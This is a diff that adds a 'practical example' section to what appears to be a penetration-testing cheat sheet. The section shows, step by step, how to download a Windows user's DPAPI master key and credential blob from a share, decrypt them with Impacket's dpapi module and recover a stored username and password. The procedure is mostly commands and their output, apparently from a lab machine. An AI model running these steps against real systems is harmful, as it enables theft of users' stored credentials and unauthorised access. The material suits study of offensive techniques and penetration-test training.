@@ -90,6 +90,56 @@ pypykatz dpapi <DPAPI master key file with GUID name> <Prekey file> -o masterkey
 pypykatz dpapi chrom --logindata Login.sqlite masterkey_file state
 ```
 
+# Decrypt secrets using a user's DPAPI master key - practical example
+```
+- Windows often stores user secrets in folders under AppData\Roaming\Microsoft , which includes subdirectories such as Credentials and Protect . These contain the encrypted credential and the master key
+
+# cd AppData\Roaming\Microsoft\Credentials 
+# ls
+Directory: C:\Users\[User]\AppData\Roaming\Microsoft\Credentials
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+drw-rw-rw-         1/29/2025 10:13 AM            .
+drw-rw-rw-         1/29/2025 10:13 AM            ..
+-rw-rw-rw-         1/29/2025  8:13 AM          398 772275FAD58525253490A9B0039791D3
+
+
+Directory: C:\Users\[User]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+drw-rw-rw-         1/29/2025 10:13 AM            .
+drw-rw-rw-         1/29/2025 10:13 AM            ..
+-rw-rw-rw-         1/29/2025  8:09 AM          740 08949382-134f-4c63-b93c-ce52efc0aa88
+-rw-rw-rw-         1/29/2025  7:53 AM          900 BK-VOLEUR
+-rw-rw-rw-         1/29/2025  7:53 AM           24 Preferred
+
+# get 08949382-134f-4c63-b93c-ce52efc0aa88 
+
+Downloads the master key file. 
+We then return to the Credentials folder to download the credential blob, which contains the encrypted user credentials protected by the master key
+
+# /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
+-rw-rw-rw- 398 Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
+# get 77..
+
+- with both the credential file and the master key , we can decrypt the stored password.
+we first decrypt the master key using Impacket’s DPAPI module. The masterkey command uses the user’s SID and password to unlock the DPAPI master key file
+impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21- 3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
+...
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a 9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+...
+
+With this decrypted key, we can unlock the credential blob we had previously downloaded.
+impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a 9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+
+[CREDENTIAL] 
+..
+Username : jeremy.combs
+Unknown : qT3V9pLXyN7W4m 
+```
+
 ## DLL tips
 ```
 # DLL tips
